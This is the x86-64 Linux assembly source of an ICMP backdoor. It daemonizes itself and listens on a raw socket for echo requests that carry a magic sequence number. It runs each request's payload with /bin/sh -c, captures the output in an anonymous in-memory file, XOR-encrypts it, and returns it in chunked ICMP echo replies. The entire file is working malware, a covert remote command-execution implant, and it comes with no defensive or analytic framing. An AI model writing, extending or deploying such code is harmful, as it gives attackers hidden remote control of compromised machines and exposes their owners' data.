section .bss
    fd_no resb 4                ; Socket file descriptor
    sniffed_data resb 1200      ; ICMP data received
    incoming_addr resb 16       ; Buffer for sender's IP and Port (sockaddr_in)
    addr_len      resd 1        ; Size of sockaddr_in (4 bytes)
    addr_ip resb 16             ; Buffer for the extracted string IP address
    full_response resb 16384    ; Buffer for total command output (16KB)

section .data
    dir db '',0                 ; Empty string for memfd_create (anonymous RAM file)
    icmp_packet:
        type db 0               ; ICMP Type 0 (Echo Reply)
        code db 0               ; ICMP Code 0
        checksum dw 0           ; Checksum placeholder
        identifier dw 0x1234    ; ID to identify our packets
        sequence db 0xBE, 0xEF  ; Sequence magic bytes (0xBEEF)
        payload times 1024 db 0  ; Buffer for command execution output
        payload_len equ $ - payload ; Length of the payload section
    newline db 10               ; ASCII newline character (\n)
    forip db 4                  ; Legacy unused variable
    space_char db 32            ; ASCII space character
    str_sh db '/bin/sh', 0      ; Shell path
    str_flag db '-c', 0         ; Command flag for /bin/sh
    argv_array:
        dq str_sh               ; Argument 0: /bin/sh
        dq str_flag             ; Argument 1: -c
        dq 0                    ; Argument 2: Pointer to the command string
        dq 0                    ; NULL terminator for argv

section .text
global _start

; --- DAEMONIZATION & RAW SOCKET SETUP ---
_start:
    mov rax, 57                 ; sys_fork: Duplicate process
    syscall
    cmp rax, 0                  ; Check if parent or child
    jne _exit                   ; Exit parent process
    mov rax, 112                ; sys_setsid: Create new session
    syscall

    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET (IPv4)
    mov rsi, 3                  ; SOCK_RAW
    mov rdx, 1                  ; IPPROTO_ICMP
    syscall                     ; Returns sockfd in rax
    mov [fd_no], eax            ; Store sockfd
;-----------------------------------------------------------------------------------------

_sniff:
    ; Setup sockaddr_in parameters for recvfrom
    mov dword [addr_len], 16    
    mov r8, incoming_addr       
    mov r9, addr_len            
    xor r10, r10                

    ; --- CLEANUP BUFFER ---
    lea rdi, [sniffed_data]    
    xor al, al                  
    mov rcx, 1200               
    rep stosb                   ; Clear buffer to prevent old data interference
;------------------------------------------------------------------------------------------

    ; --- RECEIVE ICMP PACKET ---
    mov rax, 45                 ; sys_recvfrom
    mov edi, [fd_no]            
    mov rsi, sniffed_data       
    mov rdx, 1200               
    syscall

    ; --- ICMP TYPE FILTER ---
    cmp byte [sniffed_data + 20], 8 ; Check if ICMP Type is 8 (Echo Request)
    jne _sniff                      ; Ignore and continue sniffing if not

    ; Error handling for recvfrom
    cmp rax, 0                  
    jl _error                   
    je _exit                    

    ; Minimum size check (IP Header 20 + ICMP Header 8)
    cmp rax, 28                 
    jb _sniff                   

    ; --- MAGIC SEQUENCE FILTER ---
    mov cx, word [sniffed_data + 26] ; Extract sequence number
    cmp cx, 0xADDE                   ; Match magic 0xDEAD (Little Endian)
    jne _sniff                       

    ; Extract command payload address
    lea rax, [sniffed_data + 28] 
    mov [argv_array + 16], rax       ; Inject command address into argv_array

    ; Store length and address for printing
    mov r14, rax                     
    sub r14, 28                      ; Calculate actual payload length
    lea rsi, [sniffed_data + 28]    
    mov rdx, r14                     
    push rdx                        
    push rsi                        

    ; --- IP ADDRESS TO STRING ALGORITHM ---
    xor rdx, rdx                     
    xor rbx, rbx                     
    mov rcx, 7                       ; IP byte offset 7
    mov rdi, 15                      ; String buffer offset 15
_loopforip:
    mov bl, 10                       
    movzx ax, [incoming_addr + rcx]  
_divloop:
    div bl                           ; Quotient in al, Remainder in ah
    add ah, 48                       ; Convert digit to ASCII
    mov [addr_ip + rdi], ah          
    dec rdi                          
    xor ah, ah                       
    cmp al, 0                        
    jg _divloop                      
    cmp rcx, 4                       
    je _contiune                     
    mov byte [addr_ip + rdi], 46     ; Append dot (.)
_contiune:
    dec rdi                          
    dec rcx                          
    cmp rcx, 3                       
    jg _loopforip                    

    ; --- LOGGING TO TERMINAL ---
    mov rax, 1                       ; Print Sender IP
    mov rdi, 1                       
    mov rdx, 16                      
    mov rsi, addr_ip                 
    syscall

    mov rax, 1                       ; Print Space separator
    mov rdi, 1                       
    mov rdx, 1                       
    mov rsi, space_char              
    syscall

    pop rsi                          ; Restore payload address
    pop rdx                          ; Restore payload length
    mov rax, 1                       ; Print Received Command
    mov rdi, 1                       
    syscall                          

    mov rax, 1                       ; Print Newline
    mov rdi, 1                       
    mov rsi, newline                 
    mov rdx, 1                       
    syscall

    jmp _execute_command            


_checksum_cal:
    mov word [checksum], 0          ; Reset checksum before calculation
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    ; Accumulator
    xor r11d, r11d                  
    mov rcx, 8                      ; ICMP Header size
    add rcx, r12                    ; Add current payload length
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r11d, word [icmp_packet + r13] 
    add eax, r11d                   
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
    movzx r11d, byte [icmp_packet + r13] 
    add eax, r11d                  
.wrap:
    mov ebx, eax                    
    shr ebx, 16                     ; Extract carry bits
    and eax, 0xFFFF                
    add ax, bx                     
    adc ax, 0                      
    not ax                         ; One's complement
    mov [checksum], ax              
    ret

_wait_for_child:
    mov rax, 61                     ; sys_wait4
    mov rsi, 0                      
    mov rdx, 0                      
    mov r10, 0                      
    syscall
    ret

_error:
    mov rax, 60                     ; sys_exit
    mov rdi, 1                      
    syscall

; --- COMMAND EXECUTION LOGIC ---
_execute_command:
    call _memfd_create              ; Create anonymous RAM file
    push rax                        ; Save memfd file descriptor

    mov rax, 57                     ; sys_fork
    syscall
    cmp rax, 0               
    je _execve                      ; Child runs the shell
    mov rdi, rax            
    call _wait_for_child            ; Parent waits for output to finish

    pop rdi                         ; Retrieve memfd fd
    call _lseek                     ; Rewind memfd to offset 0

    ; --- READ LOOP (Bypassing 4096-byte Page Limitation) ---
    xor r14, r14                    ; Reset total bytes read counter
_read_loop:
    mov rax, 0                      ; sys_read
    lea rsi, [full_response + r14]  ; Offset buffer based on progress
    mov rdx, 1024                   ; Read in manageable chunks
    syscall
    
    test rax, rax                   ; Check if EOF or no more data (rax=0)
    jz _read_done                   ; Exit loop if finished
    add r14, rax                    ; Increment total count
    cmp r14, 16384                  ; Check buffer capacity
    jl _read_loop                   ; Continue if under limit

_read_done:
    ; --- ENCRYPTION PHASE ---
    lea rsi, [full_response]
    mov rcx, r14                    ; Bytes to encrypt (total from loop)
    call _xor_cipher                
    
    mov rax, 3                      ; sys_close (Close memfd)
    syscall
    
    mov r15, 0                      ; Reset chunk offset
    jmp _chunk_loop                 ; Proceed to packet fragmentation
    
_chunk_loop:
    cmp r14, 0
    jle .check_last_chunk           ; Exit to EOF check if no more data

    cmp r14, 1024           
    jg .set_max_chunk               ; Cap packet size at 1024 if data is larger
    mov r12, r14            
    jmp .copy_data

.set_max_chunk:
    mov r12, 1024

.copy_data:
    cld
    lea rdi, [icmp_packet + 8]      ; Clear payload area
    xor al, al                      
    mov rcx, 1024                   
    rep stosb                       ; Zero out buffer

    lea rsi, [full_response + r15]
    lea rdi, [icmp_packet + 8]
    mov rcx, r12
    rep movsb                       ; Copy data chunk to packet

.packet_send:
    call _checksum_cal              ; Compute checksum for the new reply
    mov rax, 44                     ; sys_sendto
    mov rdi, [fd_no]                
    lea rsi, [icmp_packet]          
    lea rdx, [r12 + 8]              ; Packet size (Header + Payload)
    mov r10, 0               
    lea r8, [incoming_addr]         ; Send back to the client's IP
    mov r9, 16               
    syscall

    sub r14, r12                    ; Decrement remaining data
    add r15, r12                    ; Advance reading offset
    jmp _chunk_loop                 ; Loop for next fragment

.check_last_chunk:
    ; --- DEADLOCK PREVENTION (EOF PACKET) ---
    cmp r12, 1024                   ; Was the last chunk exactly 1024 bytes?
    jne _sniff                      ; If smaller, client already knows stream is done

    ; Send 1-byte EOF packet to notify Client if stream ended on a 1024 boundary
    mov r12, 1                      
    xor r14, r14                    
    cld
    lea rdi, [icmp_packet + 8]
    xor al, al
    mov rcx, 1024
    rep stosb                       ; Clear buffer
    
    ; Reuse send logic for the final EOF packet
    call _checksum_cal
    mov rax, 44
    mov rdi, [fd_no]
    lea rsi, [icmp_packet]
    mov rdx, 9                      ; Header (8) + EOF byte (1)
    lea r8, [incoming_addr]
    mov r9, 16
    syscall
    jmp _sniff                      ; Return to listener mode


_execve:
    ; --- I/O REDIRECTION ---
    pop rdi                         ; Retrieve memfd fd from stack
    call _dup2                      ; Redirect STDOUT and STDERR to memfd

    mov rax, 59                     ; sys_execve
    mov rdi, str_sh                 ; Path to /bin/sh
    mov rsi, argv_array             ; Args: /bin/sh -c <command>
    mov rdx, 0                      
    syscall


_dup2:
    mov rax, 33                     ; sys_dup2
    mov rsi, 1                      ; STDOUT
    syscall

    mov rax, 33                     ; sys_dup2
    mov rsi, 2                      ; STDERR (CRITICAL FOR ERROR CAPTURE)
    syscall
    ret

_lseek:
    mov rax, 8                      ; sys_lseek
    mov rsi, 0                      ; Offset 0
    mov rdx, 0                      ; SEEK_SET
    syscall
    ret

_memfd_create:
    mov rax, 319                    ; sys_memfd_create
    mov rdi, dir                    ; Empty filename
    mov rsi, 0                      
    syscall
    ret

; --- XOR CIPHER FUNCTION ---
_xor_cipher:
    test rcx, rcx                   ; Check if length is 0
    jz .done                        
    push rsi                        ; Save original pointer
.loop:
    xor byte [rsi], 0x42            ; Simple XOR encryption (Key: 0x42)
    inc rsi                         ; Move to next byte
    loop .loop                      
    pop rsi                         ; Restore pointer
.done:
    ret

_exit:
    mov rax, 60                     ; sys_exit
    mov rdi, 0                      ; Status Success
    syscall
